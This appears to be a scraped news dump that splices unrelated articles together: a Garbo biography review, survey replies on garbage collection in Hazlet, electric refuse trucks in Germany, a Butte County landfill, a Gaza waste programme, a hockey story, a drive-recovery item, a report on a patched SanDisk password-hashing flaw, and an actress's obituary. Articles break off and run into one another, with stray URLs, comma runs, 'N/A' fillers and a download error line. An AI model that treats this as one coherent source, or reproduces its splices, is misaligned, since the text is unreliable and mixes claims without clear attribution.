“I am so unexpectedly violent and have such unlicensed energy when called upon. It baffles and intrigues me and even shocks her.”

The actress’ exploits are detailed in Robert Gottlieb’s new “Garbo” (Farrar Straus and Giroux) which dishes on the busy love life and iconic film career of the shy girl from Stockholm who became Hollywood’s biggest star in the era when movies transitioned from silent to “talkies.”

Born Greta Gustafsson in 1905 to a poor Swedish family — Gottlieb describes Garbo’s father as “a hardworking but unskilled laborer” with some sources saying he was a “latrine cleaner” — Garbo (which she later adopted as her stage name) never liked school but loved the theater. She schlepped around Stockholm at night just to watch the actors go through the stage door all part of her plan to become famous herself.

“She was consumed by her determination to become not only an actress but a great star” Gottlieb writes.

In 1920 15-year-old Garbo was cast in an advertising film for a Stockholm department store and her onscreen charisma was so powerful a producer nearly collapsed at the sight of her falling against a door.

“She is so beautiful that it really pains my heart just to see her” he said.

Garbo was only 15 — Sweden’s age of consent then and now — when she likely took as her first lover Max Gumpel a Swedish Olympian and man about town but even that desirable bachelor wasn’t necessarily the only man she wanted.

She also walked past the Swedish royal palace most nights “because one of the royal princes might catch sight of me” she explained at the time to her friend Eva Blomgren.

While a student at the Royal Dramatic Training Academy Garbo was taken under the wing of Mauritz Stiller a theatre impresario known for his diamond earrings and ankle-length fur coats. In 1923 Stiller cast Garbo in his film “The Saga of Gösta Berling” but the two likely never rendezvoused on his famous casting couch.

“Everyone knew Stiller had a different kind of interest” Gottlieb writes.

In the early 1920s Garbo filmed G.W. Pabst’s “Joyless Street” in Berlin where she enjoyed the Weimar Republic’s glittery nightclubs and cabarets. During those months Garbo either did or did not — to this day nobody knows — sleep with the sexual dynamo Marlene Dietrich then an unknown actress living in Berlin. (Dietrich had an uncredited role in “Joyless Street” and thus crossed paths with Garbo.) Whatever happened there was bad blood between the two women for the rest of their lives.

For example in “Marlene Dietrich” the book written about her by her daughter Maria Riva Dietrich is quoted saying she met one of Garbo’s male lovers and was not impressed: “He was drunk the whole evening but if you have to go to bed with Garbo you have to drink.”

In 1924 studio head Louis B. Mayer saw Garbo in “Joyless Street” and decided “I’ll take a chance on Garbo.” He signed her to MGM and moved her to Hollywood where for the next 15 years the actress ruled the film world with classics like “Mata Hari” “Grand Hotel” and “Anna Karenina.”

Speaking to a reporter the actor Melvyn Douglas — who never slept with Garbo but did co-star in three movies with her — said Garbo’s popularity resulted largely from her sexual allure.

“I have never played with a woman with such an ability to arouse the erotic impulse” he said.

Perhaps nowhere was that clearer than in Garbo’s second MGM film 1926’s “Flesh And The Devil.” Garbo wasn’t initially enthused about the movie at least not until she met her co-star John Gilbert.

“She hated the script she hated her role but she didn’t hate him” Gottlieb writes.

Garbo and Gilbert ended up madly in love with their off-screen romance leading to scintillating on-screen chemistry. Decades before Hollywood “intimacy coordinators” were a thing Garbo and Gilbert’s on-set performances were so incendiary it was “embarrassing” to watch director Clarence Brown said in “Dark Star” the book about Gilbert written by his daughter Leatrice Joy Gilbert.

“Those two were alone in a world of their own. It seemed like an intrusion to yell ‘cut!’” Brown recalled. “I used to just motion the crew to another part of the set and let them finish what they were doing.”

“Flesh and the Devil” titillated the viewing public too.

“They kissed with their mouths open! They made love horizontally! She was lying on top of him! Nothing this erotic had ever been seen on the screen” Gottlieb writes.

The initial heat between Garbo and Gilbert waned partly because she rebuffed his numerous marriage proposals. By the time Gilbert died young from alcoholism a decade later Garbo couldn’t remember what all the fuss had been about dismissing any feelings she might have once had. She explained to the playwright S. N. Behrman that she’d only got involved with Gilbert because she was “lonely” and “didn’t speak English” after she moved to Los Angeles and another time wondered to a companion what she ever saw in him.

“Well I guess he was pretty.”

But Garbo had never been short of lovers. When MGM hired Sven Hugo Borg to be her interpreter in LA when the actress moved there in 1925 she quickly welcomed the handsome translator into her bed. In the 1934 movie “The Painted Veil” George Brent’s character nonchalantly seduced the unhappy wife portrayed by Garbo while in real life “Greta and George enjoyed a romantic interlude for a while — she even moved in with him” Gottlieb writes.

At a 1941 New Year’s Eve party Garbo met Erich Maria Remarque author of “All Quiet on the Western Front” who although married was a playboy known for many lovers soon including Garbo. Remarque romantically described his first interlude with Garbo in his journals.

“She entered the bedroom the light of the dressing room behind her softly flowering over her shoulders enchanting her outline the face the hands the trembling something imperceptible shook her then the voice … the absence of any form of sentimentality or melodrama — yet full of warmth” he wrote.

It’s lovely although Gottlieb also writes how Remarque would later snark to his wife screen star Paulette Goddard that Garbo had been “lousy in bed.”

Later in the war Orson Welles briefly dated Garbo — that is until he saw her refuse an autograph request from a uniformed soldier on crutches. Welles found that behavior disqualifying and immediately stopped seeing her Gottlieb writes.

In 1934 Rouben Mamoulian directed Garbo in the well-received “Queen Christina” while also enjoying intimate relations with his Swedish star. But Condé Nast writer/editor Leo Lerman reported in his journal “The Grand Surprise” that Dietrich told him the director gave Garbo gonorrhea.

“I was in the hospital with a strep throat and she was in a room above me . . . with the clap” Dietrich allegedly said. “She got it from Mamoulian.”

As for her lesbian leanings Garbo had documented dalliances with Tallulah Bankhead Billie Holiday and Louise Brooks and a rumored affair with Josephine Baker. But the actress’ enigmatic love life was perhaps best summed up by her alliance with the poet Mercedes de Acosta. According to Gottlieb de Acosta was a “ubiquitous lesbian rake” who claimed to have shared Sapphic sex with a “who’s who” of the era’s leading ladies including Dietrich Bankhead and even author Edith Wharton.

For more than three decades Garbo and de Acosta were friends and maybe lovers. Along with her on-and-off affair with Cecil Beaton the relationship with de Acosta was one of the most long-standing in Garbo’s life even though they never had any official relationship. The poet’s 1960 memoir revealed an emotional attachment between the two but doesn’t mention sex. Neither do de Acosta’s letters opened years after her death. And although de Acosta was known to have taken a photograph of a topless Garbo getting the actress naked was apparently not hard to do.

“Garbo was famous for shucking off her clothes to swim — in her pool in the ocean wherever” Gottlieb writes. “She was never embarrassed by being naked.”

9 While Garbo’s affair with star Louise Brooks is well known her rumored dalliance with Josephine Baker remains unconfirmed. Getty Images

The author believes de Acosta fell prey to Garbo’s enigmatic charm a passion that was never requited; “Mercedes was madly in love; Greta was responsive then fed up with her friend’s stifling and dramatic jealousies and sufferings.”

Between 1926’s “Torrent” and “Two-Faced Woman” in 1941 Garbo starred in almost 30 movies and was nominated for an Academy Award three times. (She never won but was awarded an honorary Oscar in 1955.) But World War II changed everything including Hollywood — with the movie industry losing interest in its Swedish star and the reclusive Garbo seemingly losing interest in acting. She never officially retired but never agreed to another role leaving California for New York City in 1953.

Of the seven-bedroom apartment she bought on 52nd Street Gottlieb writes that Garbo had all the same troubles as the rest of the city’s residents when it came to real estate.

“I had a hard time getting this” Garbo said. “They don’t like actresses in this building.”

Until her death in 1990 Garbo enjoyed a private Manhattan life with one source describing her as a “hermit-about-town” Gottlieb writes. She took long walks most days bought art — including three Renoirs — and according to the sportswriter Tony Kornheiser enjoyed regular New York Rangers games as a season ticket holder.

9 For decades rumors have persisted that Marlene Dietrich and Garbo were onetime lovers. Whatever the case they were bitter rivals.

She never had kids never married never really even had a relationship that could’ve been described as serious. Over the years no one could really figure out her love life and no one was more confused about Garbo’s laundry list of lovers than Marlene Dietrich.

“I don’t understand how she gets them all” Dietrich wrote in a letter to her husband Rudolf Sieber.

The notoriously private Garbo meanwhile never cared to explain herself to anyone. And neither did she give much thought to Dietrich. Asked by a reporter late in her life about the “German Garbo” the Swedish original coyly demurred.

“Who is this Marlene Dietrich?”"

Note: The majority of residents (84.7 percent) who responded to the survey supported Municipal Collection.

___

Yes definitely - I am up for saving some money and I think it would be more efficient if everyone had the same garbage company.

___

Yes I would love to have one garbage company servicing all of Hazlet. Especially if it offers Bulk pickup regularly in the cost.

_____

Yes. I live on a Cul-de-sac with 7 houses and we have 3 different companies wearing down our road.

_____

Absolutely. The constant price increases missed pick ups extra cost for bulk items etc. are a nuisance. Most other municipalities have this negotiated and rolled up in their taxes.

_____

Yes! It would be much appreciated and would reduce the building traffic in town. Also the bulk pick up is a high saver; in the past we’ve paid $150 for bulk pick up of general household items (no large furniture or anything oversized). Municipal garbage collection will help keep our home and yards free from clutter.

_____

Absolutely. Bid to the market. Set the hours appropriate for collection that is safe.

_____

Yes. Hoping that a town-wide garbage collection would lower each homeowner’s cost for garbage removal. As long as the quarterly price is lower than what we are currently paying.

_____

Absolutely. It’s long overdue to offer municipal garbage collection with monthly bulk pick up. It’s a pain having three different garbage companies come through the development almost every day of the week. The time of day doesn’t bother me since I’m up by 5:30 even on weekends; however these local roads were not meant for so many loud and heavy trucks. Having just bought my parent’s home I was so surprised with how the garbage companies are constantly changing their rates and having to shop around every once in awhile is a hassle especially as a new homeowner.

_____

Yes. Let's get a set price that is affordable for all. My rates have gone up almost every bill. It may not be a lot but they nickel and dime you until they force you to find a cheaper service. I would like bulk pickup once a month. That would be a great service. It would be nice to have one company instead of 4-5 servicing the town. Please try and make this happen. Thanks.

_____

Would absolutely appreciate a monthly bulk pickup and one municipal company to handle the trash at a reasonable hour. It would also help with notifications during inclement weather that pickup could be delayed.

_____

Yes but only if the pricing is reasonable and isn’t increased 10-20+% year over year.",https://news.google.com/articles/CBMiXWh0dHBzOi8vd3d3LnNlYXR0bGV0aW1lcy5jb20vc2VhdHRsZS1uZXdzL3BvbGl0aWNzL3NlYXR0bGUtc3Vlcy1raW5nLWNvdW50eS1pbi1nYXJiYWdlLWZpZ2h0L9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Seattle sues King County in garbage fight,"ERROR: Article `download()` failed with HTTPSConnectionPool(host='www.seattletimes.com', port=443): Read timed out.

A real-world comparison at two waste management firms in Germany | electrive.com,"Fuel-cell or battery-electric trucks to collect waste? Both types are increasingly finding their way into municipal waste disposal companies. We asked around in Freiburg and Munich where one waste management company is currently testing two fuel cell refuse collection vehicles the other an all-electric roll-off tipper.

* * *

Freiburg’s waste management company (ASF) has worked with various electric vehicles for many years. So far it has deployed 17 vehicles: small sweepers forklifts vans and cargo bikes of different makes with battery capacities designed for daily trips of up to 100 kilometres. By 2030 ASF aims to have converted its fleet of around 170 vehicles including company cars to alternative drive systems.

Another step towards this goal was ASF recently starting to use two waste collection vehicles from Germany’s Faun Umwelttechnik powered by fuel cells and a payload of eleven tons. “I am convinced that in the heavy-duty commercial vehicle sector fuel cells are more forward-looking than pure e-drives” says Michael Broglin Managing Director of ASF. According to the managing director the new collection vehicle’s payload of eleven tons is as high as a conventionally powered diesel truck. Its range of approximately 200 kilometres also meets the requirements of daily tours.

In addition to the environmental aspect these two factors were decisive in choosing the fuel cell vehicles. With the two Faun trucks ASF could save up to 60 tons of CO2 a year during the daily collection of organic and paper waste. “We’ve also achieved significantly lower noise emissions for our drivers and the waste workers behind the vehicles are no longer standing in the exhaust fumes – their reaction so far has been positive all around” says Broglin. Drivers who have been using the H2 vehicles no longer want to switch. The plan is to use twelve more collection vehicles with climate-friendly technology in Freiburg by the end of 2023.

Faun a commercial vehicle manufacturer based in Osterholz-Scharmbeck has been adapting fuel cells for commercial vehicles for several years at its headquarters north of Bremen. In Faun’s so-called Bluepower chassis fuel cells are combined with a battery. In the Freiburg models the fuel cell has 30 kW and the battery’s energy content of 85 kWh. The latter provides additional energy during acceleration and absorbs recuperation energy – an elementary task in the everyday stop-and-go traffic of waste management.

N/A N/A N/A

“We chose the fuel-cell variant because we can charge the vehicles and refuel them with hydrogen. At the moment we get by with one tank filling per week” the managing director tells us. The tank capacity for hydrogen is 16.4 kilograms at 700 bar. He says that no green hydrogen from renewable energy is available yet but that should change soon. “Otherwise things won’t add up” says Broglin. Currently the power supply at ASF is being converted to medium voltage to guarantee the electrical energy supply is better. In this course the charging infrastructure including charging management will also be adapted. In total ASF has 70 AC charging points with 22 kilowatts (kW) and one DC charger with 40 kW which the company built in cooperation with the local energy supplier.

ASF’s share of electric vehicles is expected to grow significantly. The plan is to be exclusively all-electric in 2025 in the city cleaning sector where lighter vehicles are predominantly used. For heavy-duty vehicles Broglin expects to have made the switch to zero-emission operation by 2030.

The acquisition costs of the two hydrogen-powered waste collection vehicles – around 1.44 million euros (net) three times as much as conventional diesel trucks – were covered to about 75 per cent by federal subsidies. A grant of around 925000 euros (net) was provided by the German Federal Ministry of Transport and Digital Infrastructure. An additional grant of 150000 euros (net) was provided through the Innovation Fund of badenova AG & Co. KG. ASF also received funding for most of the other e-vehicles.

Alternative drive systems for heavy commercial vehicles are also on the rise at the waste management company in Munich (AWM). For example for about a year the municipal waste disposal company has been using Volvo FE Electric roll-off tipper for container logistics from the recycling centres to a nearby disposal facility. The 27-ton truck is equipped with four lithium-ion batteries each with 50 kWh and is on the road throughout the Bavarian capital.

AWM had already put a comparable vehicle with roll-off tipper and diesel hybrid technology from Volvo Trucks into operation in 2012. “We had a very good experience with that. Now taking the next step with this all-electric truck is the logical consequence” says Reinhold Bauer AWM’s fleet manager. He discovered the FE Electric at a trade fair two years ago was immediately taken with it and initiated the tender for its procurement. The vehicle has been subsidised at 90 per cent of the additional cost compared to a diesel truck.

“Our drivers love it because it’s quiet innovative and beautiful” he says. The payload is more than 14 tons and the range is about 100 kilometres. “For our special use and testing that’s enough for now” he adds. However he says he initially assumed that there would be enough fast-charging stations in the city where the vehicle’s battery could be temporarily charged. However Bauer was disappointed to discover that there is only one suitable charging station in the whole of Munich.

“We need 700 volts of voltage but most charging stations are only designed for 500 or 600 volts” he realised after first believing the Volvo charging cable was broken. Even the charging point that is suitable in itself cannot be approached: “When we drive there we block the rest of the service station and the operator is understandably less than thrilled about that” Bauer describes.

N/A N/A N/A N/A

The electric roll-off tipper charges exclusively at the depot but so far only AC charging points with 22 kW are available there. So in one hour the driver only brings ten per cent SoC to his vehicle there. Bauer: “We could double the range if we had our own fast-charging station.” One is now planned for the first quarter of 2022. Until then the charging process will continue to occur overnight at 22 kW. “For our drivers the range is already a challenge but they have learned to make do with the battery capacity or return in time to avoid risking a layover” he says.

The RL 18 body of the FE Electric comes from Meiller. As a result the roll-off tipper can be operated safely using a radio remote control. “This gives our drivers a better overview” explains Bauer because in addition to environmental protection AWM also focuses on safety for its personnel. Thanks to the all-electric drive the body of the roll-off tipper is now also considerably quieter than with a conventional vehicle since the hydraulic pump only runs when the roll-off tipper is actually in operation. The resulting energy savings in turn increase the range for the truck.

By 2030 the city of Munich and the waste disposal company plan to convert the fleet of around 250 heavy vehicles to climate-neutral drives and fuels. By summer 2022 AWM will be using 64 natural gas vehicles. In addition ten partially electrified light refuse collection vehicles which AWM has built in collaboration with Mercedes Faun and Zöller are on the road in a small series. Bauer also envisages testing fuel cell technology. A Faun vehicle with its Bluepower technology has been ordered but will probably not be delivered until October 2022. AWM is also taking advantage of the city and federal funding programs to convert its fleet to alternative drives.

Editor’s note: For international use cases and models of electric garbage trucks please also refer to refuse trucks. One of the most recent examples and long-standing models is BYD’s waste collection vehicle now deployed in New Jersey USA. Volvo Group’s subsidiary Mack Trucks also makes the Mack LR Electric refuse truck in the US. Across the pond Westminster City Council and its waste contractor Veolia unveiled a 60-strong fleet of new and ‘upcycled’ electric vehicles in October among the largest in the UK.

During a special meeting on Monday the Butte County Board of Supervisors unanimously voted to purchase the property from a single-party owner. The land has no housing and had previously been a placeholder for potential livestock.

The cost of the land comes out to a total of $708000. Of that sum $250000 was paid to the previous landowner Nance Canyon Partners L.P. on Tuesday.

This agreement adds 118 acres to the facility though what will become of the land is still in the earliest stages.

Butte County Public Works Director Joshua Pack said the master planning process for the long-term goal of the additional parcels will likely begin in early 2022. Pack said in more than 50 years of existence there have been five major expansions to the facility.

“Based on that right now between current use and the size of the landfill we’re expected to reach capacity by 2050” Pack said. “We’re certainly not at the precipice but we can see it on the horizon.”

The county has plenty of options for expansion. Pack said the extra land for now could just work as a buffer zone for the facility.

“The landfill is a very important part of the county’s operation” Pack said. “It serves virtually every resident. I think we need to have an honest assessment of what we have now and what we need to do in the future to best serve our residents.”

Pack said the additional land at the north and west of the landfill will offer some flexibility for the county as it determines the best use of it.

“Public Works will be asking the board to adopt a contract to begin the master planning process hopefully in early 2022” Pack said. “It’s a fairly robust process and we’re going to want to get input from our partners the cities businesses and local haulers.”

The facility resides in Supervisor Tod Kimmelshue’s district. Kimmelshue stressed the importance of expanding the property as a safeguard for the future.

“We will eventually have to expand the facility not necessarily for more capacity but to make sure we have room for recycling facilities as well as having control over the properties so we can make sure they don’t get contaminated and have neighbors upset with us” Kimmelshue said.

The landfill will also need to keep up with new recycling technology as it becomes more available. Laws for maintaining landfills in California have also changed throughout the years and will likely continue to shift.

“I just think people need to know that landfills are becoming more and more sophisticated and eventually there will be very little put in landfills as it will be mostly recycled or made into compost” Kimmelshue said. “When you do those things you need huge facilities to sort those materials. The bottom line is that it’s quite a science and something we need to make sure we have enough land around the facility to make sure we can facilitate those kinds of expansions.”

The Butte County Board of Supervisors generally meets at 9 a.m. on the second and third Tuesday of the month at its chambers located at 25 County Center Drive Suite 205 in Oroville. Meetings are free and open to the public.

Jerusalem – The Government of Belgium and the United Nations Development Programme signed a contribution agreement worth US$7.2 million in support of improving natural resources management reducing and managing waste and creating green jobs in the Gaza Strip.

The situation in the Gaza Strip is facing alarming environmental social institutional and financial challenges that have led to serious constraints in solid waste management services provision. In addition the lack of sanitary disposal sites has further deteriorated the environment contaminating precious groundwater resources. The five-year programme will not only serve as a launchpad for introducing efficient comprehensive and innovative solutions to reduce environmental contamination and waste of natural resources but will also protect the health and wellbeing of Gaza residents.

Consul General of Belgium Mr Wilfried Pfeffer highlighted that the programme is not only in line with Belgium’s strategy towards circular economy and the transition to greener jobs particularly for youth but it also addresses global challenges such as climate change.

Through the first phase the focus will be given to the establishment of an environmentally and socially sound waste management system that utilized new techniques to reduce waste production. Comprehensive research studies and strategic plans will be developed in consultation with key stakeholders and innovative approaches will be identified to improve natural resources management waste reduction and green jobs creation.

Furthermore the programme will enhance the knowledge and capacities of the Joint Services Council municipalities and the private sector and strengthen linkages between solid waste management and green jobs creation through piloted initiatives.

UNDP Special Representative of the Administrator Yvonne Helle highlighted the criticality of the solid waste situation in the Gaza Strip and it being a constant source of pollution to the environment. “The only way for us to stop the waste mountains from growing and change the behaviour of dumping illegal waste is this programme as it complements other initiatives implemented by UNDP to improve waste management. Your confidence in taking the leap with us to embark on this very complex programme is greatly appreciated” she added.

In partnership with the private sector and local community the programme will also support the cleaning and greening of Wadi Gaza wetland and contribute to the development of a plan and awareness campaigns to monitor and safeguard the cleanliness of the Wadi.

The signing ceremony which took place on Thursday 09 December 2021 was attended by the Consul General of Belgium Mr Wilfried Pfeffer; Head of Belgium Cooperation Ms Leen Verstraelen; UNDP Special Representative of the Administrator Ms Yvonne Helle and UNDP Deputy Special Representative Chitose Noguchi.

It is worth noting that the Gaza population is expected to grow from the current 2.07 million (2020) to 4.03 million by the year 2040. The total amount of household waste generated per day will also increase to 3383 tons / day in 2040 in comparison to the 1726 tons/ day in 2018. Additionally 147 tons / day of commercial waste 157 tons/ day of market waste and 1200 tons / days of agricultural waste will be generated in 2040.

As the decade old issue has come back to haunt the farmers of Nuvem due to the pollution of the Bokti tollem by discharge of sewage waters Chief Minister Pramod Sawant on Friday instructed officials of the PWD and Goa Sewerage Corporation to complete work on the new Fatorda sewerage line by May 2022.

Inspecting the lake waters along with Nuvem MLA Wilfred D’Sa and officials on Friday evening the Chief Minister also told the PWD officials to cut the road near the district hospital to facilitate discharge of the line.

The Chief Minister said that the issue of inundation of the Bokti tollem and other water bodies by the sewage water has left the fields polluted. He said the officials of the sewerage corporation who were called for the inspection have been told to complete all work on the new line by May 2022.

“This is an old issue which has been plaguing the water bodies since many years. A permanent solution will come by May next year” he said.",,,,,,,,,,,,

Read more

GLENDALE Ariz. ― When Flyers general manager Chuck Fletcher shipped off defenseman Shayne Gostisbehere to the Arizona Coyotes in July after seven seasons on Philadelphia’s blue line Gostisbehere retired his jersey No. 53 in favor of No. 14.

In a way the decision marked a return to his Union College roots. Gostisbehere who wore No. 14 for three years with the Dutchmen helped lead his school to their first NCAA championship title in 2014 (at the Wells Fargo Center of all places).

But beyond embracing what he called “some pretty good luck” that comes with No. 14 Gostisbehere’s switch serves as material representation of the career reset he seeks with the Coyotes.

“Coming to Arizona in general it was a little bit of a reset for my career and coming to a team that’s rebuilding it’s a full reset not only personally but team-wise too” Gostisbehere said before the Coyotes’ game against the Flyers on Saturday night. “I think it was a good blend for myself and my family. For me to just go out there and have fun doing the things that I’m capable of doing getting the results it’s pretty cool after a tough couple years.”

On an individual level Gostisbehere is well on his way to rebounding with the Coyotes after a challenging final three seasons with the Flyers marked by injury. Through 26 games played Gostisbehere has scored four goals and 13 assists which puts him on pace for roughly 13 goals and 41 assists if he sustains his current rate of production. Gostisbehere’s 17 points this season is tied for the team lead with center Clayton Keller.

More than a quarter of the way through the 2021-22 season Gostisbehere’s offensive output is reminiscent of his stellar 2017-18 season with the Flyers. That year Gostisbehere set career-highs in assists (52) points (65) and plus-minus (plus-10).

Despite Gostisbehere’s success the 5-19-2 Coyotes have struggled to put together a winning formula ranking last in the league in goals scored per game (1.73).

“It’s definitely a balance of obviously personally you’re doing very well. On the other end the team’s not doing too good standings-wise. It was maybe a little to be expected but you’ve got to be grateful for ... you get to have this job and do what we do every day. So I think for me it’s just being a positive guy even at our highs and more importantly at our lows.”

Saturday night’s game between the Flyers and Coyotes marks Gostisbehere’s first time playing against his former team in his new home arena. In his last outing as a Coyote at the Wells Fargo Center on Nov. 2 Gostisbehere logged 19:31 minutes of ice time and notched two shots on goal.

Gostisbehere admitted he felt “nervous” going back to the Wells Fargo Center but now that feeling has mostly dissipated as he squares off against his former team once again.

“It’s definitely not as weird as it was when I went back to Philly” Gostisbehere said. “Philly was that was crazy. Lot of waves of emotions and memories. Crazy things. A lot of things happened to me in that building. I won a national championship there scored my first NHL goal there first NHL game. A lot of special memories there.

“At home it’s a little different. You’re a little more comfortable when you’re at home. I think for me it’s a little different but still kind of weird.”

Brown building after injury

On Nov. 16 against the Calgary Flames fourth-line forward Patrick Brown jammed his thumb and was forced to miss nearly three weeks as he recovered from surgery.

Brown finally returned to the lineup on Dec. 5 against the Tampa Bay Lightning and broke through on Friday night against his former Vegas Golden Knights team registering an assist on Max Willman’s first NHL goal. Interim head coach Mike Yeo was pleased with Brown’s performance describing him as a “warrior” on both ends of the ice.

“The way that he was battling on the defensive side of things and his face-off circles and the penalty kill you know time’s — he obviously filled an important void for us when Coots [Sean Couturier] was off [with an injury]” Yeo said. “And so he just went out and played the game the right way. And with that obviously he’s found an identity with our team.”

After snapping the team’s 10-game skid with their 4-3 win over the Golden Knights Brown is looking to improve his game while the team works toward sustaining their recent success.

“I think we can use that and build off it and remember that no matter who we’re playing we have to play like that every single game a full 60” Brown said. “Supporting the puck all over the ice sharing the breakouts.”

It’s entirely possible to have a hard drive fail even if your data is still in perfect condition on the magnetic platters inside. [Keith Sherry] was recently trying to recover data for a friend off a damaged hard drive and demonstrated that modern twists on old tricks can still work.

The drive in question was an old 160GB disk that itself was being used as a backup. Of course a backup you haven’t tested is no backup at all and this one failed in the hour it was most needed.

The suspicion was that the controller board was the culprit and that swapping the board out might bring things back to life. Back in the day this was a common hacker trick. However it often fails with modern drives which store a great deal of drive-specific calibration data on the controller board. Without this specific data another controller will be unable to access the data on the drive and could even cause damage.

However as [Keith] demonstrates there is a way around this. A controller from a similar drive was sourced albeit from a SATA version of the drive versus the original which used USB. A single chip is then removed from the original controller containing the calibration data specific to that drive. Soldering this chip onto the new controller got everything up and running and the files could be recovered.

If your data is invaluable it’s likely worth paying a professional. As [Keith] demonstrates though the old tricks can still come in handy as long as your techniques are up to date. DIYing your own data recovery can be done it’s just risky is all.

Oh and don’t forget — once you’ve recovered the files throw the drive away. Don’t keep using it! Video after the break.

Pierluigi Paganini December 11 2021 December 11 2021

Vulnerabilities in the Western Digital SanDisk SecureAccess can be exploited to access user data through brute force and dictionary attacks.

Western Digital has released updates for its SanDisk SecureAccess software to fix multiple vulnerabilities that can be exploited to access user data by carrying out brute force and dictionary attacks.

The SanDisk SecureAccess software now rebranded SanDisk PrivateAccess allows storing and protecting critical and sensitive files on SanDisk USB flash drives.

The access to user’s private vault is protected by a personal password and all the files are automatically encrypted.

According to the vendor SanDisk SecureAccess version 3.02 was using a one-way cryptographic hash with a predictable salt This means that the software is vulnerable to dictionary attacks. The software also uses a password hash with insufficient computational effort as a consequence an attacker can brute force user passwords leading to unauthorized access to user data.

“SanDisk SecureAccess 3.02 was using a one-way cryptographic hash with a predictable salt making it vulnerable to dictionary attacks by a malicious user. The software also made use of a password hash with insufficient computational effort that would allow an attacker to brute force user passwords leading to unauthorized access to user data.” reads the advisory published by SanDisk.

“Both the key derivation function issues described above have been resolved in SanDisk PrivateAccess Version 6.3.5. SanDisk SecureAccess has been rebranded to SanDisk PrivateAccess.”

The vulnerabilities tracked as CVE-2021-36750 were discovered by researcher Sylvain Pelissier. Western Digital addressed the issue with the release of SanDisk PrivateAccess version 6.3.5.

If you are using SanDisk SecureAccess to protect your data you should update: https://t.co/UCZqLQBZZ6 — Sylvain Pelissier (@Pelissier_S) December 10 2021

“The key derivation function issues have been addressed by using PBKDF2-SHA256 together with a randomly generated salt” continues the advisory.

The IDB closed on the property for $18 million at a special session on Nov. 30. The 422-acre property is roughly north of Charles Bell Road west of Hampton Station Road and south of the railway (in the below map property numbers 15 17 and 18 in purple plus 16 in green).

Of those 422 acres approximately 375 are considered developable according to Clarksville-Montgomery County Economic Development Council CEO Buck Dellinger.

The new “Park East” is attracting attention from companies looking to move here many of whom have shown interest in buying half or all of the park.

Expanding the job market

Along with these companies come thousands of new job opportunities across a range of fields.

“Workforce is constrained right now” Dellinger told Clarksville Now. “It’s a tight market for that. All these jobs with these different industries that are looking at us we’re being very selective and these are high-tech advanced manufacturing jobs. … We’re not trying to compete against (current employers) for any new companies that may be interested in coming here.”

Names have not been provided for the interested companies due largely to nondisclosure agreement constraints. However two potential projects were presented at the EDC’s regular session on Wednesday by Director of Business Development Vonda Gates using project names.

Project Ocean

The company behind Project Ocean is part of the electric vehicle industry and could bring over 4000 jobs with a starting wage of $23/hour and $4 billion in capital investments.

According to Gates Clarksville is not the only community on this company’s radar with at least three other Eastern U.S. properties being considered and two more in Texas.

Gates said discussions with the company are in early stages. If Project Ocean were to choose Clarksville they would want the entirety of Park East as well as an additional 46-acre property.

Project Lisbon

Project Lisbon involves a company from the tech industry. Lisbon has the potential to bring $800.6 million in capital investments and 2000 jobs with a $23/hour starting wage.

IDB Director Shea Hopkins said staff would be headed to California soon for negotiations with Project Lisbon’s company. Joining them will be state officials who are also offering incentives to bring the company to Tennessee.

Project Lisbon would likely be interested in at least half of Park East.

‘And of course we’re in Tennessee’

According to Dellinger these are only two of several interested parties for East Park. EDC VP of Communications & Marketing Michelle Hueffmeier stressed that these are only potential options.

“What’s important to note is that we are continually being sought out for large projects and this activity is reflective of the growth of the community” Hueffmeier told Clarksville Now.

Regardless of who ends up calling Park East home it is likely the land will be sold quickly. With quick access to a railway and the interstate it’s a prime location.

“There’s a lot of interest in it because it’s a sizable piece of land” Dellinger said. “It’s got awesome utilities. It’s going to have really good access once we get the four-lane road complete and it’s close to the interstate. It’s very buildable land.

“And of course we’re in Tennessee which from a business perspective is advantageous for most companies. … You can get to 70% of the U.S population within a day’s drive from us which makes distribution a good option.”",https://news.google.com/articles/CBMiX2h0dHBzOi8vd3d3LmhvbGx5d29vZHJlcG9ydGVyLmNvbS9tb3ZpZXMvbW92aWUtbmV3cy9jYXJhLXdpbGxpYW1zLWRlYWQtZGVmaWFudC1vbmVzLTEyMzUwNjEzODQv0gFjaHR0cHM6Ly93d3cuaG9sbHl3b29kcmVwb3J0ZXIuY29tL21vdmllcy9tb3ZpZS1uZXdzL2NhcmEtd2lsbGlhbXMtZGVhZC1kZWZpYW50LW9uZXMtMTIzNTA2MTM4NC9hbXAv?hl=en-US&gl=US&ceid=US%3Aen,Cara Williams Sitcom Star and Oscar Nominee for ‘The Defiant Ones’ Dies at 96,"Cara Williams the perky redhead who received an Oscar nomination for her performance in The Defiant Ones before starring in a pair of CBS sitcoms in the 1960s has died. She was 96.

Williams died Thursday of a heart attack at her home in Beverly Hills her daughter Justine Jagoda told The Hollywood Reporter. “My mom was a loving soul she would take you in her arms and always help you” she said.

A native of Brooklyn Williams also worked alongside Audrey Hepburn in her first feature We Go to Monte Carlo (1951) shared a dance with James Cagney as a character named Winnipeg in Never Steal Anything Small (1959) and played a moll in the Danny Kaye comedy The Man From the Diners’ Club (1963).

She was married to actor John Drew Barrymore the son of movie legend John Barrymore and the father of actress Drew Barrymore from 1953-59.

In the memorable Stanley Kramer drama The Defiant Ones (1958) starring Tony Curtis and Sidney Poitier as escaped convicts who spend much of the movie being chained together Williams portrayed the lonely mother of a young son who falls for Curtis’ character.

Williams worked on the film for just two weeks “for very little money” she said in an interview for The Midnight Palace. “I was shocked when I was nominated for an Academy Award because I really walked through that movie. I never really studied my lines I practically studied them on the set.”

Curtis once told TV Guide that Williams “is a complete original. There’s nobody like her. She’s a very sexy girl but she’s also like a man. I’ll tell you what she’s like: She’s like having a best friend you’d like to kiss.”

Williams starred as the TV wife of future M*A*S*H great Harry Morgan on Pete and Gladys which debuted in September 1960. A scatterbrained woman who often found herself in hot water her character resembled that of another famous redhead Lucille Ball.

The Lucy-Desi Comedy Hour had aired its final episode five months earlier. Williams’ new show aired on Monday nights too and many of Pete and Gladys‘ writers and producers had collaborated with Ball.

“When I was playing Gladys people would say ‘That’s not a character part for her that’s her [in real life]'” she said. “I’m a little ditzy.”

Morgan had starred on the popular 1954-59 CBS comedy December Bride as insurance agent and next-door neighbor Pete Porter who was always complaining about his wife. Gladys though was never seen during the show’s five seasons.

In 1962 Williams received an Emmy nomination for her work but Pete and Gladys was canceled after its second season.

After the show aired in reruns on daytime TV for two years Williams returned to primetime with The Cara Williams Show playing a file clerk who marries the company office-efficiency expert (Frank Aletter). However they have to keep that a secret because their firm prohibits couples from working together.

That show was gone after one season.

